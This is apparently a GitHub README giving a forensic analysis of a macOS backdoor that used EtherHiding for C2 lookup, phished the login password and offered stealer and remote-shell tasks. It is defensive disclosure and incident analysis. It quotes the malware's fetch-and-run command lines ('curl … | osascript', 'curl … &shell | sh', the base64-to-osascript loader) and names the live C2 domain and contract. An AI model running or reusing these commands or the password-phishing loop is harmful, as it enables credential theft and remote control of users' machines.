# my-macbook-get-infected-round-2

Digital-forensic record of a second compromise of my MacBook (macOS 14, Darwin 23.6.0),
discovered on 2026-08-19 (a suspicious LaunchAgent moved to `~/Desktop/_quarantine-2026-08-19/`)
and fully analysed on 2026-09-11. Round 1 (xmrig cryptominer) is documented in
[my-macbook-get-infected-by-xmrig](https://github.com/korrio/my-macbook-get-infected-by-xmrig).

> **TL;DR (EN)** — A LaunchAgent `com.qxgpjsivitldyooj` ran an obfuscated AppleScript loader that used
> **EtherHiding** (reads its C2 hostname from a Polygon smart contract) to pull a second-stage
> **AppleScript backdoor** from `jse8x92s.me`. The backdoor phished and verified my real macOS login
> password (stored in `~/.passphrase`), reset all TCC privacy permissions, and polled the C2 every 60 s
> for tasks: run a stealer module, run a "replacer", or open a remote shell. It was installed
> 2026-08-10 08:40:50 and stayed active until quarantined on 2026-08-19 (about 9 days). The C2 is still
> live as of 2026-09-11. The xmrig miner from round 1 was almost certainly dropped through this backdoor.

> **สรุป (TH)** — LaunchAgent ชื่อ `com.qxgpjsivitldyooj` รัน AppleScript ที่ถูก obfuscate โดยใช้เทคนิค
> **EtherHiding** (อ่านชื่อโดเมน C2 จาก smart contract บน Polygon) เพื่อดึง **backdoor ขั้นที่สอง** จาก `jse8x92s.me`
> backdoor ตัวนี้หลอกถามรหัสผ่าน login ของ Mac จนกว่าจะถูก (เก็บไว้ที่ `~/.passphrase`), ล้างสิทธิ์ Privacy (TCC) ทั้งหมด
> แล้ว poll C2 ทุก 60 วินาที รอคำสั่ง: รัน stealer, รัน "replacer", หรือเปิด remote shell
> ติดตั้งเมื่อ 2026-08-10 08:40:50 และทำงานอยู่จนถูก quarantine วันที่ 2026-08-19 (ประมาณ 9 วัน)
> C2 ยังมีชีวิตอยู่ ณ วันที่ 2026-09-11 และ xmrig จากรอบแรกน่าจะถูกส่งเข้ามาผ่าน backdoor ตัวนี้

---

## 1. Timeline (Asia/Bangkok, from file birth times, browser history and TCC.db)

| Time (2026-08-10) | Event | Source |
|---|---|---|
| 08:33:13 | Working normally: new project `voice.aq1.co` created, Claude Code OAuth login at 08:33–08:34 | file birth, Chrome history |
| 08:35–08:38 | Browsing local dev server, Cloudflare dashboard (aq1.co DNS) | Chrome history (Profile 3) |
| 08:39:21 | Only download in the window: a `.jpeg` from a Facebook group photo (not executable) | Chrome downloads table |
| 08:39–08:40 | chatgpt.com, exat.aq1.co/maintenance | Chrome history |
| **08:40:50** | **`~/Library/LaunchAgents/com.qxgpjsivitldyooj.plist` created** (stage 1 loader) | file birth time |
| **08:40:58** | **`~/.passphrase` created** – backdoor validated my real login password via `dscl . authonly` after a fake "To run the application you need to change the settings…" dialog | file birth time, stage 2 code |
| **08:41:00** | **`~/.txid` created** – C2 replied `newconnect`; backdoor immediately ran `tccutil reset All` | file birth time, stage 2 code |
| 08:41:01 → 09:17 | Cascade of TCC re-grants (One Markdown, CleanMyMac, LINE, Chrome camera/mic…) – consistent with every app having lost its permissions | `TCC.db` `last_modified` |
| 08:46 | CleanMyMac X permissions re-granted (I was probably scanning the Mac because it felt wrong) | TCC.db |
| 08:49:41 | `com.apple.settings.PrivacySecurity.extension.plist` first created (Privacy & Security pane opened) | file birth |
| 2026-08-10 → 08-19 | Backdoor active (RunAtLoad + KeepAlive): C2 could push stealer / replacer / remote shell at any time. Round-1 xmrig miner appeared in this window. | plist keys, stage 2 |
| 2026-08-19 14:32 | Plist moved to `~/Desktop/_quarantine-2026-08-19/`; `com.korrio.security-watchdog` LaunchAgent installed | dir mtime, watchdog log |
| 2026-09-11 | Full analysis (this repo). C2 domain still resolving and still serving stage 2. | this investigation |

**Initial access vector: not determined.** There is no quarantined download, no `.dmg`/`.pkg`, no relevant
`zsh_history` entry in the window, and no AI-agent transcript from that time. The dropper wrote the plist
directly at 08:40:50 while I was in a browser. Most likely candidates: a ClickFix-style "paste this into
Terminal" lure, or a malicious installer/script executed from a page in a browser whose history was not
retained. Unified log retention did not reach back to 2026-08-10.

## 2. What the malware is

### Stage 1 – LaunchAgent loader (`evidence/samples/com.qxgpjsivitldyooj.plist.txt`)

```
/bin/bash -c "echo '<base64>' | base64 -d | osascript"
RunAtLoad = true, KeepAlive = true
```

The base64 is AppleScript whose every string is built from `(ASCII character N) & "x" & (character id N)`
fragments. De-obfuscated (`evidence/samples/stage1_loader.deobfuscated.txt`) it:

1. Calls `eth_call` on Polygon contract **`0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0`**, selector
   **`0x2686ecea`**, through four public RPC gateways (drpc, publicnode, tatum, tenderly), and ABI-decodes
   the returned string. On 2026-09-11 it returned **`jse8x92s.me`**. This is the *EtherHiding* technique:
   the C2 address lives on-chain, so it cannot be taken down and can be rotated by the attacker at will.
2. `curl -X POST https://<c2> -d 'txid=d50f29d4d180318d6c36afa9a59b0514&bmodule' | osascript`

### Stage 2 – `bmodule` backdoor (`evidence/samples/stage2_bmodule_backdoor.deobfuscated.txt`, fetched 2026-09-11, 32 934 bytes)

| Capability | Implementation |
|---|---|
| Bot identity | `IOPlatformUUID` via `ioreg`, `whoami`, hard-coded `txid` |
| C2 discovery | Same Polygon contract; verifies with `POST -d check` → `success` |
| **Password theft** | Reads `~/.passphrase`; if missing/invalid, loops a `display dialog … with hidden answer` ("To run the application you need to change the settings for its operation. Enter your password") and validates each attempt with `dscl . authonly <user> <pw>` until correct, then writes the cleartext password to `~/.passphrase` |
| **Privacy reset** | On first `connect` → `newconnect`: writes `~/.txid` and runs `tccutil reset All` |
| Task loop (every 60 s) | `POST …&task` → `notasks` / `runloader` / `runlight` / `replacer` / `openshell` |
| `runloader` | `curl … -d 'txid=…&smodule' \| osascript` – stealer module (AMOS-family style: Keychain, browser data, wallets, Notes, files) |
| `runlight` | `… &lmodule \| osascript` |
| `replacer` | fetches and runs a "replacer" module (typically clipboard crypto-address swapping) |
| `openshell` | `curl … &shell \| sh` – **arbitrary remote shell as my user, backgrounded with `nohup`** |

Family: this matches the AppleScript-based macOS stealer/backdoor ecosystem (AMOS / "Odyssey" / MacSync-style
backdoors) that in 2025–2026 moved its C2 lookup to EtherHiding smart contracts.

## 3. Impact assessment

Because the attacker held (a) my macOS login password, (b) a remote shell as my user, and (c) a stealer
module, for ~9 days, **everything readable by my user account must be treated as compromised**:

- macOS login password and therefore the **login Keychain** (all saved Wi-Fi, app and website passwords)
- Browser profiles: Chrome (17 profiles), Brave, Firefox, Edge, Arc – saved passwords, cookies/sessions
- Crypto wallet extensions present: MetaMask (Chrome Profile 1 & 3, Brave), Phantom (Chrome Profile 1); `~/.nansen/wallets`
- `~/.ssh/` – 8 private keys (GitHub Actions, Bitbucket, GCE, OCI, deploy keys)
- `~/.aws/sso`, `~/.kube/config`, `~/.boto`, `~/.foundry`, Cloudflare session (I was logged in to the dashboard at 08:37)
- 93 `.env` files under the home directory (API keys, DB credentials)
- Discord token, Telegram/LINE data, Notes, Documents/Desktop files
- Claude Code / ChatGPT / OpenAI / Codex / Gemini OAuth tokens under `~/.claude`, `~/.codex`, `~/.gemini` etc.

No evidence of a second persistence mechanism was found (LaunchAgents/Daemons, cron, login items,
shell rc files, sudoers, `/etc/hosts`, SSH `authorized_keys`, unpacked browser extensions all clean on
2026-09-11), but a remote shell means the attacker *could* have left something outside the locations checked.

## 4. Evidence in this repo

```
evidence/samples/   original plist, stage-1 and stage-2 AppleScript (raw + de-obfuscated), SHA256SUMS
evidence/system/    ~/.txid, redacted ~/.passphrase metadata, birth timestamps, live persistence/TCC snapshot
evidence/iocs.txt   all indicators (contract, selector, domain, IPs, paths, commands)
tools/              static de-obfuscator used (never executes the sample)
CLEANUP.md          what was cleaned, what still needs sudo, and the credential-rotation checklist
```

Samples are stored as `.txt`. They are inert unless piped into `osascript`. Do not run them.

## 5. Lessons (TH/EN)

- **EN:** A LaunchAgent whose `ProgramArguments` is `bash -c "echo … | base64 -d | osascript"` is malware, full stop.
  Any unexpected macOS password dialog that is not the standard system sheet is a phish. `tccutil reset All`
  followed by every app re-asking for permissions is a strong compromise signal.
- **TH:** LaunchAgent ที่รัน `bash -c "echo … | base64 -d | osascript"` คือมัลแวร์แน่นอน
  dialog ถามรหัสผ่าน Mac ที่หน้าตาไม่เหมือนของระบบ = phishing และถ้าจู่ๆ ทุกแอปขอสิทธิ์ Privacy ใหม่หมด แปลว่าโดน `tccutil reset All`
- The password-validation loop means the attacker *knows the password is correct*. Change it first, before anything else.

*Analysis performed with Claude Code on 2026-09-11; all sample handling was static (decode/de-obfuscate only).*
